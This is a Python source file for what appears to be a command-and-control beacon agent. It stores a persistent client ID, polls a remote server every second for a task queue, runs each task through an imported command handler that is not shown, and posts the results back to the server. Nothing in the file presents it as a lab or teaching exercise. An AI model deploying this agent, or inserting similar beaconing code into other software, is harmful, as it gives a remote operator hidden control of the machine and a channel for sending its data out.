import argparse
import logging
import json
import requests
import time
import uuid
from commands import COMMANDS, handle_task  # Add this import


LOG_FORMAT = "[%(levelname)s] %(message)s"
LOG_DEBUG_FORMAT = "[%(threadName)s-%(filename)s-%(funcName)s-%(lineno)s | %(levelname)s] %(message)s"

log = logging.getLogger(__name__)

HEARTBEAT_INTERVAL = 1 # seconds
UUID_FILE = "identifier.tok"

def get_client_uuid():
    try:
        with open(UUID_FILE, "r") as file:
            return file.read().strip()
    except FileNotFoundError:
        new_uuid = str(uuid.uuid4())
        with open(UUID_FILE, "w") as file:
            file.write(new_uuid)
        return new_uuid
    
def send_task_result(client_uuid : str, host : str, port : int, task_id : int, response_body : dict):
    try:
        response = requests.post(f"http://{host}:{port}/api/agent/{client_uuid}/{task_id}", json=response_body)
        if response.status_code != 200:
            return False
            log.error(f"Error while sending task result: {response.status_code}")
    except Exception as e:
        log.error(f"Error while sending task result: {e}")
        return False
    return True

def handle_tasks(client_uuid, host, port, tasks : list):
    #log.debug(f"Received tasks: {tasks}\n")
    if (len(tasks) == 0):
        return
    log.debug(f"Received tasks: {tasks}")
    for task in tasks:
        log.debug(f"Handling task: {task}")
        response_body = handle_task(task)
        task_id = task["taskid"]
        if send_task_result(client_uuid, host, port, task_id, response_body):
            log.debug(f"Successfully sent task result for task {task_id}")


def tasking_loop(client_uuid, host, port):

    while True:

        try:
            response = requests.get(f"http://{host}:{port}/api/agent/{client_uuid}/taskqueue")

            if response.status_code == 200:
                task_que = response.json()
                handle_tasks(client_uuid, host, port, task_que)
            
            elif response.status_code == 404:
                log.debug("No tasking")
            else:
                log.error(f"Unknown response code: {response.status_code}")
        except Exception as e:
            log.error("Error while retrieving tasking:")
            log.error(e)

        time.sleep(HEARTBEAT_INTERVAL)

def run(args):
    client_uuid = get_client_uuid()
    log.debug(f"Client UUID: {client_uuid}")

    tasking_loop(client_uuid, args.host, args.port)

class SymbolFormatter(logging.Formatter):
    symbols = ["x", "!", "-", "+", "DBG"]

    def format(self, record):
        symbol_record = logging.makeLogRecord(vars(record))

        for index, symbol in enumerate(self.symbols):
            if record.levelno >= (len(self.symbols) - index) * 10:
                symbol_record.levelname = symbol
                break

        return super(SymbolFormatter, self).format(symbol_record)
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", type=str, default="")
    parser.add_argument("--port", type=int, default=3001)
    parser.add_argument("--debug", action="store_true", default=False, help="Show debug information")
    parser.add_argument("--logging", type=str, help="Log file")

    args = parser.parse_args()

    log = logging.getLogger(__name__)
    log.setLevel(logging.DEBUG)

    formatter = logging.Formatter(LOG_DEBUG_FORMAT) if args.debug else SymbolFormatter(LOG_FORMAT)
    handler = logging.StreamHandler()
    handler.setLevel(logging.DEBUG if args.debug else logging.INFO)
    handler.setFormatter(formatter)
    log.addHandler(handler)

    if args.logging:
        file_handler = logging.FileHandler(args.logging)
        file_handler.setLevel(logging.DEBUG if args.debug else logging.INFO)
        file_handler.setFormatter(formatter)
        log.addHandler(file_handler)

    try:
        run(args)
    except KeyboardInterrupt:
        log.debug("keyboard interrupt")
    except AssertionError as e:
        log.error(e)
    except Exception as e:
        log.debug("Unknown exception")
        log.exception(e)

if __name__ == "__main__":
    main()









